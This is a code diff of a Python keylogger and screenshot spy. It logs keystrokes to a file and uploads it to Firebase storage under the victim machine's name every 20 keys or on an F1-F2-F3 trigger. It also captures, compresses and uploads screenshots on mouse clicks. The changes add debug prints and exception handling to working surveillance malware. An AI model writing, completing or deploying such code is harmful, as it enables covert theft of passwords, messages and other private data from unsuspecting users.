@@ -39,25 +39,26 @@ def on_press(key):
     try:
         if lastThreeKeys == ['Key.f1', 'Key.f2', 'Key.f3']:
             f.close()
-
+            print('?')
             storage.child(os.environ['COMPUTERNAME'] +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
-
+            print('!')
             # delete screenshot.jpg + data.txt
             os._exit(1)
 
         elif len(data) % 20 == 0:
             f.close()
-
+            print('?')
             storage.child(os.environ['COMPUTERNAME'] +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
-
+            print('!')
             f = open('data.txt', 'a+', encoding='utf-8')
         printKey(key)
-    except:
-        printKey(key)
+    except Exception as e:
+        print(e)
+        # printKey(key)
 
 
 def printKey(key):
@@ -111,20 +112,23 @@ def on_click(x, y, button, pressed):
         # take screenshot and upload to firebase storage
         clicks_counter = 0
 
-        with mss.mss() as sct:
-            sct.shot(output=imgPath)
+        try:
+            with mss.mss() as sct:
+                sct.shot(output=imgPath)
 
-            # try to save bitmap instead, or some other small size format of pics
-            image = Image.open(imgPath)
-            image = image.resize((1000, 562), Image.ANTIALIAS)
-            image.save(imgPath, quality=50, optimize=True)
+                # try to save bitmap instead, or some other small size format of pics
+                image = Image.open(imgPath)
+                image = image.resize((1000, 562), Image.ANTIALIAS)
+                image.save(imgPath, quality=50, optimize=True)
 
-            full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
-            today_date = full_currentTime.split(' ')[1]
+                full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
+                today_date = full_currentTime.split(' ')[1]
 
-            storage.child(os.environ['COMPUTERNAME'] +
-                          '/screenshot_' + full_currentTime + '.jpg') \
-                .put(imgPath)
+                storage.child(os.environ['COMPUTERNAME'] +
+                              '/screenshot_' + full_currentTime + '.jpg') \
+                    .put(imgPath)
+        except Exception as e:
+            print(e)
 
 
 # Collect events of mouse clicks and keyboard keys
